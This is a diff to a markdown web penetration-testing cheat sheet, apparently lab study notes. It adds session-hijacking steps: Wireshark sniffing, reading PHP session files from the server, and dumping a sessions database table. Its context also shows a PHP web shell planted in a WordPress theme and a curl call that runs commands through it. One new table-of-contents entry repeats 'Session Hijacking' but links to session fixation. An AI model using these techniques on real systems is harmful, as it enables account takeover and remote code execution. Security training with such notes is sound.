@@ -25,8 +25,9 @@ Overview
 21. - [XML External Entity (XXE) Injection](#21---xml-external-entity-xxe-injection)
 22. - [File Inclusion](#22---file-inclusion)
 23. - [Session Hijacking](#23---session-hijacking)
-24. - [WordPress](#24---wordpress) 
-25. - [Exploit Research](#25---exploit-research)
+24. - [Session Hijacking](#24---session-fixation)
+25. - [WordPress](#25---wordpress) 
+26. - [Exploit Research](#26---exploit-research)
    
 #1. - Web Requests
 -----------------------------------------
@@ -1670,7 +1671,34 @@ OR
 http://oredirect.htb.net/login?PHPSESSID=ac7o1erbkmob8lzy1xq1abu5k8k5rgvw
 ```
 
-#24. - WordPress
+- Session Identifiers Traffic Sniffing
+
+```
+$ sudo -E wireshark
+Edit -> Find Packet
+```
+
+- Session Identifiers Web Server Access
+
+```
+$ locate php.ini
+$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
+$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
+$ ls /var/lib/php/sessions
+$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
+```
+
+- Session Identifiers Database Access
+
+```
+show databases;
+use project;
+show tables;
+select * from all_sessions;
+select * from all_sessions where id=3;
+```
+
+#25. - WordPress
 -----------------------------------------
 
 - Version Enumeration
@@ -1732,7 +1760,7 @@ system($_GET['cmd']);
 $ curl -X GET "http://<URL>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
 
-#25. - Exploit Research
+#26. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
